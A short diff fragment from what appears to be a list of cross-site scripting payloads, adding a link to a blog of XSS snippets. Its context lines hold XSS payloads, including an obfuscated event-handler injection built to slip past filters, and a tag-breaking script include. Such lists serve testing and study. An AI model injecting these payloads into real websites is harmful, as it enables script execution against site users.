@@ -18,3 +18,7 @@
 "onmouseover="(new	Function('rssseturn(alesssrt)'.&#x73plit('sss').joi&#x6e('')))()(('SXS'+'SXS').slice(-5,4))"
 "onclick="alert('XSS')"
 "><script src="file:///c:/wonderful.js"></script><"
+
+
+Linkler:
+http://www.cnblogs.com/hustskyking/p/xss-snippets.html
